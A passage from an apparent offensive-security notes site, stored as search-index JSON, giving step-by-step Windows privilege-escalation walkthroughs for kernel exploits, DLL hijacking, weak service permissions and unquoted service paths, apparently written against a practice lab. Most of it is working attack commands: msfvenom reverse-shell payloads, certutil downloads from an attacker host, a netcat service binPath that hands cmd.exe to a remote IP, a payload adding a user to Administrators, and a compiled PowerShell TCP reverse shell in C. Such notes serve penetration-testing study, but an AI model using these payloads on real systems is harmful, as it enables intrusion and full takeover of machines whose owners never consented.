</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Exploiting-Kernel-Vuln/","title":"Exploiting Kernel Vuln","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Exploiting-Kernel-Vuln/#exploiting-with-metasploit","title":"Exploiting with Metasploit","text":"<ol> <li> <p>We discovered that the target is potentially vulnerable to the following kernel vulnerabilities:  </p> <p></p> <p>Note: <code>exploit/windows/local/always_install_elevated</code> enables privilege escalation by abusing the AlwaysInstallElevated policy on Windows systems.</p> </li> <li> <p>For this exploit, set the <code>LHOST</code>, <code>LPORT</code>, and <code>SESSION</code> fields.  </p> <ul> <li><code>SESSION</code> should be the active Meterpreter session (e.g., 1).  </li> <li><code>LPORT</code> must be different from the port used in the initial session (1338 in this case).  </li> </ul> <pre><code>use exploit/windows/local/always_install_elevated\nset SESSION 1\nset LHOST [IP-ADDRESS]\nset LPORT [PORT]\nrun\n</code></pre> <p></p> </li> <li> <p>Run the exploit to obtain a SYSTEM shell.  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/Exploiting-Kernel-Vuln/#exploiting-with-windows-exploit-suggester","title":"Exploiting with Windows Exploit Suggester","text":"<ol> <li> <p>Using Windows Exploit Suggester, we identified that the target is potentially vulnerable to several kernel exploits: <code>python3 wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only</code> </p> <p></p> </li> <li> <p>Download and compile an exploit using <code>searchsploit</code>:  </p> <pre><code>searchsploit 40564\nsearchsploit -m windows_x86/local/40564.c\nx86_64-w64-mingw32-gcc 40564.c -o ms11-046.exe -lws2_32\n</code></pre> <p></p> </li> <li> <p>Alternatively, search for a pre-compiled version of the exploit.  </p> <p></p> <p>Note: Be cautious with pre-compiled executables as they may contain backdoors. Always use trusted sources.</p> </li> <li> <p>Example: MS11-046 pre-compiled exploit.  </p> <p></p> </li> <li> <p>To download, click the Raw link for the executable.  </p> <p></p> </li> <li> <p>Transfer the exploit to the target machine (see File Transfer section for techniques). Example using a Python HTTP server: <pre><code>python3 -m http.server 8000\n</code></pre></p> <p></p> </li> <li> <p>Execute the exploit on the target and confirm successful privilege escalation. Example using <code>certutil</code>: <pre><code>certutil -urlcache -f http://[IP-ADDRESS]:8000/ms11-046.exe ms11-046.exe\n</code></pre></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/readme/#introduction","title":"Introduction","text":"<p>The kernel is the core of any operating system. It acts as a critical intermediary between application software and the computer\u2019s physical hardware. Because it has complete control over system operations, kernel security is crucial.  </p> <p>Exploiting a kernel vulnerability can allow an attacker to execute commands with SYSTEM privileges, the highest level of access on a Windows system.</p> Important <p>Kernel exploits should always be considered a last resort. They can be unstable, often leading to a one-time success or, in many cases, causing the system to crash.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Kernel-Exploits/readme/#resources","title":"Resources","text":"<ul> <li>Windows Exploit Suggester - Next Generation (WES-NG)</li> </ul>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/DLL-Hijacking/","title":"DLL Hijacking","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/DLL-Hijacking/#introduction","title":"Introduction","text":"<p>DLL hijacking is a cyberattack that exploits the way Windows applications search for and load Dynamic Link Libraries (DLLs). By manipulating how DLLs are resolved, an attacker can gain elevated privileges or execute arbitrary code.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/DLL-Hijacking/#how-dll-hijacking-works","title":"How DLL hijacking works","text":"<ol> <li>Services in Windows load DLLs with the same privileges as the service. If an attacker controls the DLL, their code executes with those privileges.  </li> <li>Absolute path vulnerability: When a service loads a DLL from a writable path, an attacker can replace it with a malicious one to escalate privileges.  </li> <li>If an application fails to find a required DLL, an attacker can place a malicious DLL in a directory that Windows searches, hijacking execution.  </li> <li>Windows searches for DLLs in a specific order. Attackers exploit this by placing a malicious DLL in a location searched before the legitimate one.</li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/DLL-Hijacking/#steps-to-identify-and-exploit-insecure-service-executables","title":"Steps to identify and exploit insecure service executables","text":"<ol> <li> <p>Use winPEAS to list non-Microsoft services: <code>.\\winPEASx64.exe quiet servicesinfo</code></p> <p></p> </li> <li> <p>Verify writable directories in the service configuration: <code>sc qc dllsvc</code></p> </li> <li> <p>Check service access permissions with AccessChk: <code>.\\accesschk.exe /accepteula -uvqc user dllsvc</code></p> </li> <li> <p>Use Procmon to monitor DLL activity for the service: <code>Procmon64.exe</code></p> </li> <li> <p>Apply filters to exclude registry and network activity, focusing on DLL-related errors.  </p> </li> <li> <p>Look for failed DLL load attempts, especially in writable directories such as: <code>C:\\Temp</code></p> </li> <li> <p>Generate a malicious DLL payload with msfvenom: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT_NUMBER] -f dll -o hijackme.dll</code></p> </li> <li> <p>Place the malicious DLL in the target directory: <code>move hijackme.dll C:\\Temp</code></p> </li> <li> <p>Restart the vulnerable service to trigger DLL execution: <pre><code>net stop dllsvc\nnet start dllsvc\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/","title":"Service Enumeration","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/#enumerating-service-permissions-with-powerup","title":"Enumerating service permissions with PowerUp","text":"<ol> <li> <p>If you don\u2019t already have PowerUp, download it: <code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</code> </p> <p></p> </li> <li> <p>Host the PowerUp.ps1 script using Python: <code>python3 -m http.server 8000</code> </p> <p></p> </li> <li> <p>Transfer the script to the target machine using certutil: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/PowerUp.ps1 PowerUp.ps1</code> </p> <p></p> </li> <li> <p>To bypass the PowerShell execution policy and run PowerUp.ps1: <code>powershell -ep bypass -c \"&amp; {.\\PowerUp.ps1}\"</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/#enumerating-service-permissions-with-sharpup","title":"Enumerating service permissions with SharpUp","text":"<p>SharpUp is a tool for identifying Windows service misconfigurations commonly used in privilege escalation.</p> <ol> <li> <p>If you don\u2019t already have SharpUp, download it: <code>wget https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/SharpUp.exe</code> </p> <p></p> </li> <li> <p>Host the executable using Python: <code>python3 -m http.server 8000</code> </p> <p></p> </li> <li> <p>Transfer it to the target machine with certutil: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/SharpUp.exe SharpUp.exe</code> </p> <p></p> </li> <li> <p>Run all checks with the <code>audit</code> command. In this example, the tool identified the <code>filepermsvc</code> service as vulnerable: <code>.\\SharpUp.exe audit</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/#enumerating-service-permissions-with-winpeas","title":"Enumerating service permissions with winPEAS","text":"<ol> <li> <p>Since the target runs a 64-bit OS, host the 64-bit winPEAS binary with Python: <code>python3 -m http.server 8000</code></p> <p></p> <p>Note: You can confirm system architecture with: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Transfer winPEAS to the target machine: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/winPEASx64.exe winPEASx64.exe</code> </p> <p></p> </li> <li> <p>Run winPEAS to search for weak service permissions: <code>.\\winPEASx64.exe</code> </p> <p></p> <p>Note: The \u201cServices Information\u201d section in winPEAS lists all services, their configurations, and potential security issues.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/#enumerating-weak-service-file-permissions-icacls","title":"Enumerating weak service file permissions (icacls)","text":"<ol> <li> <p>Review Microsoft\u2019s icacls documentation for details about permissions.  </p> <p></p> </li> <li> <p>Check folder permissions for the service: <code>icacls \"C:\\Program Files\\File Permissions Service\"</code> </p> <p></p> <p>Note: This shows that <code>BUILTIN\\Users</code> have (RX) Read &amp; Execute permissions.</p> </li> <li> <p>Check permissions of the service binary itself: <code>icacls \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"</code> </p> <p></p> <p>Note: This shows that <code>Everyone</code> has (F) Full Control, allowing modification or deletion of the binary.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Enumeration/#enumerating-weak-service-file-permissions-accesschk","title":"Enumerating weak service file permissions (AccessChk)","text":"<ol> <li> <p>If you don\u2019t have the Sysinternals Suite, download it from the official Microsoft site.  </p> <p></p> <p>Note: Confirm architecture (32/64-bit) with: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Host the binary with a Python HTTP server and transfer it: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/accesschk64.exe accesschk64.exe</code> </p> <p></p> <p>Note: With <code>accesschk</code> now on the target, we can enumerate permissions.</p> </li> <li> <p>View permissions on the service binary: <code>.\\accesschk64.exe -wvu \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" -accepteula</code> </p> <p></p> <p>Note: This shows that <code>Everyone</code> has (RW) Read and Write permissions, granting the ability to modify or replace the service binary.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Exploitation/","title":"Service Exploitation","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/Service-Exploitation/#exploiting-a-vulnerable-service-with-metasploit","title":"Exploiting a vulnerable service with Metasploit","text":"<ol> <li> <p>Use <code>msfvenom</code> to create a reverse shell payload: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe-service -o reverse.exe</code> </p> <p></p> Note <p>If the vulnerable service is running from Program Files (x86), create a 32-bit executable. A 64-bit payload may not run properly in that case.</p> </li> <li> <p>Start a listener on the attacking machine: <code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT [PORT]; run\"</code> </p> <p></p> Note <p>Alternatively, start a simple netcat listener: <code>sudo rlwrap -cAr nc -lvnp 1338</code></p> </li> <li> <p>Transfer <code>reverse.exe</code> to the target machine: <code>certutil -urlcache -f http://10.11.92.52:8000/reverse.exe reverse.exe</code> </p> <p></p> </li> <li> <p>Replace the vulnerable service binary (<code>filepermservice.exe</code>) with your payload, keeping the original binary name:  </p> <pre><code>Copy-Item -Path \"C:\\Temp\\reverse.exe\" -Destination \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" -Force\n</code></pre> <p></p> Note <p>In <code>cmd</code>, you can use: <code>copy /y c:\\Temp\\reverse.exe \"c:\\Program Files\\File Permissions Service\\filepermservice.exe\"</code></p> </li> <li> <p>Restart the service to trigger execution: <pre><code>sc stop filepermsvc\nsc start filepermsvc\n</code></pre>     or <code>net start filepermsvc</code></p> <p></p> Important <p>If <code>SeShutdownPrivilege</code> is enabled, you can also reboot the machine to restart the service automatically: <code>shutdown /r /t 0 /f</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Permissions-Executable/readme/#insecure-service-permissions-executable","title":"Insecure service permissions (executable)","text":"<p>This misconfiguration occurs when a service\u2019s executable file has weak permissions, allowing an attacker to modify or replace it with a malicious binary. If the service runs with elevated privileges (e.g., SYSTEM), this can be leveraged for privilege escalation.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Enumeration/","title":"Service Enumeration","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Enumeration/#enumerating-services-manually","title":"Enumerating services manually","text":"<ol> <li> <p>Use <code>wmic</code> to display all non-standard services running on the system: <code>wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"</code></p> <p></p> </li> <li> <p>The same can be done in PowerShell with <code>Get-WmiObject</code>: <code>Get-WmiObject -class Win32_Service -Property Name,DisplayName,PathName,StartMode | Where {$_.PathName -notlike \"C:\\Windows\\*\"} | Select PathName,DisplayName,Name</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Enumeration/#enumerating-services-with-accesschk","title":"Enumerating services with AccessChk","text":"<ol> <li> <p>If you don\u2019t have the Sysinternals Suite, download it from the official Microsoft site.  </p> <p></p> <p>Note: Confirm that the target is 64-bit: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Host the binary with Python and transfer it to the target with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/accesschk64.exe accesschk64.exe</code></p> <p></p> </li> <li> <p>Use AccessChk to find services writable by the current user: <code>.\\accesschk64.exe \"%USERNAME%\" -wuvc * -accepteula</code></p> <p></p> <p>Note: Here, the <code>daclsvc</code> service has <code>SERVICE_CHANGE_CONFIG</code> permissions, meaning any user can modify it. The other permission of interest for escalation is <code>SERVICE_ALL_ACCESS</code>.</p> </li> <li> <p>PowerUp can also perform service misconfiguration checks in one command: <code>powershell -NoProfile -ExecutionPolicy Bypass -Command \"&amp; {.\\PowerUp.ps1; Invoke-AllChecks}\"</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Enumeration/#enumerating-service-permissions-with-winpeas","title":"Enumerating service permissions with winPEAS","text":"<ol> <li> <p>Since the target runs a 64-bit OS, host winPEASx64 with Python: <code>python3 -m http.server 8000</code></p> <p></p> <p>Note: Confirm architecture with: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Transfer winPEAS to the target: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/winPEASx64.exe winPEASx64.exe</code></p> <p></p> </li> <li> <p>Run winPEAS to search for weak service permissions: <code>.\\winPEASx64.exe</code></p> <p></p> <p>Note: The \u201cServices Information\u201d section provides a detailed list of services, configs, and security issues.</p> </li> <li> <p>Scrolling further down, the \u201cModifiable Services\u201d sub-section highlights services the current user can modify.</p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Enumeration/#gathering-service-information","title":"Gathering service information","text":"<ol> <li> <p>The most important service attributes are the start mode, binary path, and <code>StartName</code>. Example: <code>sc qc daclsvc</code></p> <p></p> </li> <li> <p>In PowerShell: <code>Get-WmiObject win32_service | ?{$_.Name -like 'daclsvc'} | select Name, DisplayName, StartMode, State, PathName, StartName</code></p> <p></p> <p>Note: Here, <code>StartName</code> is <code>LocalSystem</code>, meaning the service runs with SYSTEM privileges. If it were another account, we would need to adjust the configuration so it executes as SYSTEM.</p> </li> <li> <p>Use SetACL to enumerate detailed permissions on the service: <code>.\\SetACL.exe -on \"daclsvc\" -ot srv -actn list</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Exploitation/","title":"Service Exploitation","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Exploitation/#exploiting-insecure-service-with-netcat","title":"Exploiting insecure service with Netcat","text":"<ol> <li> <p>Host the <code>nc</code> binary using Python: <code>python3 -m http.server 8000</code> </p> <p></p> <p>Note: Kali has a built-in copy of <code>nc.exe</code> located in <code>/usr/share/windows-resources/binaries/</code>.</p> </li> <li> <p>Transfer the binary to the target machine using <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/nc64.exe nc64.exe</code></p> <p></p> </li> <li> <p>To exploit the service, place <code>nc.exe</code> in <code>C:\\Temp</code> and modify the service binary path: <code>sc config daclsvc binPath= \"C:\\Temp\\nc64.exe [IP-ADDRESS] 443 -e C:\\Windows\\System32\\cmd.exe\"</code></p> <p></p> </li> <li> <p>On the attacker machine, set up a Netcat listener on port 443, then start the service: <code>sc start daclsvc</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/Service-Exploitation/#exploiting-insecure-service-with-metasploit","title":"Exploiting insecure service with Metasploit","text":"<ol> <li> <p>Generate a reverse shell payload with <code>msfvenom</code>: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=[PORT] -f exe-service -o reverse.exe</code></p> <p></p> <p>Note: After creating the reverse shell payload, transfer it to the target machine.</p> </li> <li> <p>Start a listener on the attacking machine with Metasploit: <code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT [PORT]; run\"</code></p> <p></p> </li> <li> <p>Alternatively, start a listener with Netcat: <code>sudo rlwrap -cAr nc -lvnp 1338</code></p> </li> <li> <p>Modify the service binary path and restart the service: <pre><code>sc config daclsvc binPath= \"C:\\Temp\\reverse.exe\"\nsc stop daclsvc\nsc start daclsvc\n</code></pre>     or <code>net start daclsvc</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Insecure-Service-Permissions/readme/#introduction","title":"Introduction","text":"<p>Insecure service permissions can create serious security risks in Windows environments. These permissions are defined through Access Control Lists (ACLs), which determine what actions users can perform on a service.</p> Note <p>\u26a0\ufe0f Potential rabbit hole: If you can modify a service configuration but do not have permission to stop/start the service, privilege escalation may fail. Always confirm you have sufficient access before attempting exploitation.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Enumeration/","title":"Service Enumeration","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Enumeration/#enumerating-service-permissions-with-get-acl-powershell","title":"Enumerating service permissions with Get-Acl (PowerShell)","text":"<ol> <li> <p><code>Get-Acl</code> is a built-in cmdlet in PowerShell. No additional modules are required. Microsoft documentation </p> <p></p> <p>Note: We can use the following command to enumerate folder permissions.</p> </li> <li> <p>Unlike <code>icacls</code>, <code>Get-Acl</code> does not explicitly list \"Modify\". Instead, it provides an Access Mask Format, where numbers represent permissions (e.g., Modify). <code>Get-Acl -Path C:\\ | Format-List</code> </p> <p></p> </li> <li> <p>For example, numerical value <code>-1610612736</code> represents Read and Execute. <code>Get-Acl -Path \"C:\\Program Files\" | Format-List</code> </p> <p></p> </li> <li> <p>In this example, <code>BUILTIN\\Users</code> have <code>FullControl</code> on <code>C:\\Program Files\\Unquoted Path Service</code>. <code>Get-Acl -Path \"C:\\Program Files\\Unquoted Path Service\" | Format-List</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Enumeration/#enumerating-service-permissions-with-icacls-cmd","title":"Enumerating service permissions with icacls (CMD)","text":"<ol> <li> <p>To verify permissions with <code>icacls</code>, review Microsoft\u2019s documentation.  </p> <p></p> </li> <li> <p>Example for <code>C:\\</code>: Administrators and SYSTEM have Full Control; Authenticated Users can create folders but not files. <code>icacls C:\\</code></p> <p></p> </li> <li> <p>Example for <code>C:\\Program Files</code>: TrustedInstaller has Full Control; SYSTEM and Administrators have Modify/Full Control; Users have Read &amp; Execute. <code>icacls \"C:\\Program Files\"</code></p> <p></p> </li> <li> <p>Example for <code>C:\\Program Files\\Unquoted Path Service</code>: Users, SYSTEM, and Administrators have Full Control (inherited). <code>icacls \"C:\\Program Files\\Unquoted Path Service\"</code></p> <p></p> </li> <li> <p>Example for <code>C:\\Program Files\\Unquoted Path Service\\Common Files</code>: Users have Read &amp; Execute; SYSTEM/Administrators have inherited Full Control; CREATOR OWNER also has inherited Full Control. <code>icacls \"C:\\Program Files\\Unquoted Path Service\\Common Files\"</code></p> <p></p> </li> <li> <p>POC: Moving an EXE into <code>C:\\</code>, <code>C:\\Program Files</code>, or <code>C:\\Program Files\\Unquoted Path Service\\Common Files</code> is blocked, but works in <code>C:\\Program Files\\Unquoted Path Service\\</code>.  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Enumeration/#enumerating-service-permissions-with-accesschk","title":"Enumerating service permissions with AccessChk","text":"<ol> <li> <p>Download the Sysinternals Suite if not already installed: Microsoft site.  </p> <p></p> <p>Note: Verify system architecture: <code>systeminfo | findstr /B /C:\"System Type\"</code></p> </li> <li> <p>Host <code>accesschk64.exe</code> with Python and transfer it: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/accesschk64.exe accesschk64.exe</code></p> <p></p> </li> <li> <p>Enumerate permissions on <code>C:\\</code>. Output shows write access is restricted to creating subfolders (<code>FILE_ADD_SUBDIRECTORY</code>). <code>.\\accesschk64.exe -wvud \"C:\\\" -accepteula</code></p> <p></p> </li> <li> <p>For <code>C:\\Program Files</code>: SYSTEM and Administrators have extensive permissions; standard users cannot write. <code>.\\accesschk64.exe -wvud \"C:\\Program Files\" -accepteula</code></p> <p></p> </li> <li> <p>For <code>C:\\Program Files\\Unquoted Path Service</code>: All users, including standard users, have Full Write permissions. <code>.\\accesschk64.exe -wvud \"C:\\Program Files\\Unquoted Path Service\" -accepteula</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Enumeration/#enumerating-unquoted-service-paths-with-winpeas","title":"Enumerating unquoted service paths with winPEAS","text":"<ol> <li> <p><code>winPEAS</code> can detect unquoted service paths in the \u201cService Information\u201d section.  </p> <p></p> </li> <li> <p>Scroll further to the \u201cApplication Information \u2192 Installed Applications\u201d sub-section to check which directories in the unquoted path are writable.  </p> <p></p> </li> </ol> Note <p>If no writable directories are found in the unquoted service path, the service cannot be exploited.</p>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Exploitation/","title":"Service Exploitation","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Exploitation/#exploiting-insecure-service-with-metasploit","title":"Exploiting insecure service with Metasploit","text":"<ol> <li> <p>Create a binary to add a user to the Administrators group with <code>msfvenom</code>: <code>msfvenom -p windows/x64/exec CMD='net localgroup Administrators [USERNAME] /add' -f exe &gt; common.exe</code> </p> <p></p> </li> <li> <p>Host the binary using Python HTTP server and transfer it with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/common.exe common.exe</code></p> <p></p> </li> <li> <p>Move the binary into the vulnerable path: <code>move common.exe \"C:\\Program Files\\Unquoted Path Service\\\"</code></p> <p></p> </li> <li> <p>Run the service to trigger the exploit: <code>net start unquotedsvc</code> </p> <p></p> <p>Note: If <code>SeShutdownPrivilege</code> is enabled, you can reboot to restart the service automatically: <code>shutdown /r /t 0</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Exploitation/#generating-reverse-shell-with-msfvenom","title":"Generating reverse shell with msfvenom","text":"<ol> <li> <p>Create a reverse shell binary with <code>msfvenom</code>: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=[ATTACKER-IP] LPORT=[PORT] -o unquotedpathservice.exe</code> </p> <p></p> </li> <li> <p>Host the binary using Python HTTP server and transfer it with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/unquotedpathservice.exe unquotedpathservice.exe</code> </p> <p></p> </li> <li> <p>Copy the reverse shell to the vulnerable path and rename it to match the first valid segment of the unquoted path: <code>copy C:\\Temp\\unquotedpathservice.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"</code> </p> <p></p> </li> <li> <p>Start a listener on the attacker machine: <code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT [PORT]; run\"</code> </p> <p></p> <p>Note: Alternatively, start a Netcat listener: <code>sudo rlwrap -cAr nc -lvnp 1338</code></p> </li> <li> <p>Start the service on the target to execute the exploit: <code>net start unquotedsvc</code> </p> <p></p> <p>Note: If <code>SeShutdownPrivilege</code> is enabled, reboot to restart the service automatically: <code>shutdown /r /t 0</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Exploitation/#creating-a-custom-exploit","title":"Creating a custom exploit","text":"<ol> <li> <p>Create a C file (<code>exploit.c</code>) on your attacker machine with the following code:  </p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(){ \n    system(\"powershell.exe -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('[IP-ADDRESS]',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"\");\n    return 0; \n}\n</code></pre> <p></p> </li> <li> <p>Compile the exploit using <code>mingw-w64</code>: <code>x86_64-w64-mingw32-gcc exploit.c -o common.exe</code> </p> <p></p> <p>Note: If <code>mingw-w64</code> is not installed: <code>apt install mingw-w64</code></p> </li> <li> <p>Host the binary using Python HTTP server and transfer it with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/common.exe common.exe</code> </p> <p></p> </li> <li> <p>Move the binary to the vulnerable path: <code>move common.exe \"C:\\Program Files\\Unquoted Path Service\\\"</code> </p> <p></p> </li> <li> <p>Start a listener and execute the service: <pre><code>sudo rlwrap -cAr nc -lvnp 1337\nnet start unquotedsvc\n</code></pre></p> <p></p> <p>Note: If <code>SeShutdownPrivilege</code> is enabled, reboot to restart the service automatically: <code>shutdown /r /t 0 /f</code></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Hunting/","title":"Service Hunting","text":""},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Hunting/#hunting-for-unquoted-services-manually","title":"Hunting for unquoted services manually","text":"<ol> <li> <p>First, check the privileges of the current user: <code>whoami /priv</code></p> <p></p> <p>Note: The <code>SeShutdownPrivilege</code> allows restarting a machine. Even if you lack permissions to directly stop/start a service, restarting the machine will also restart the service, enabling exploitation. This privilege can still be used when shown as \"Disabled\" because it is only disabled for the current session.</p> </li> <li> <p>Manually hunt for unquoted service paths with <code>cmd</code>: <code>wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"</code> </p> <p></p> </li> <li> <p>Manually hunt for unquoted service paths with PowerShell: <code>Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select Name,DisplayName,StartMode,PathName</code></p> <p></p> <p>Note: Both commands confirm that the <code>unquotedsvc</code> service has an unquoted path and is configured as a Manual service.</p> </li> <li> <p>Check service path configuration and permissions to start the service: <code>sc sdshow unquotedsvc</code></p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Hunting/#hunting-for-unquoted-services-with-powerup","title":"Hunting for unquoted services with PowerUp","text":"<ol> <li> <p>If you don\u2019t already have PowerUp, download it: <code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</code></p> <p></p> </li> <li> <p>Host the script using Python: <code>python3 -m http.server 8000</code></p> <p></p> </li> <li> <p>Transfer the script to the target with <code>certutil</code>: <code>certutil -urlcache -f http://[IP-ADDRESS]:8000/PowerUp.ps1 PowerUp.ps1</code></p> <p></p> </li> <li> <p>Bypass the PowerShell execution policy and run PowerUp: <code>powershell -ep bypass -c \"&amp; {.\\PowerUp.ps1}\"</code></p> <p></p> <p>Note: PowerUp can enumerate misconfigurations and sometimes exploit them. However, finding an unquoted service path does not always mean it\u2019s exploitable. PowerUp may suggest an <code>AbuseFunction</code>, assuming exploitation is possible.</p> </li> </ol>"},{"location":"Offensive-Security/Windows-Environment/Privilege-Escalation/Service-Exploits/Unquoted-Service-Paths/Service-Hunting/#hunting-for-unquoted-services-with-winpeas","title":"Hunting for unquoted services with winPEAS","text":"<ol> 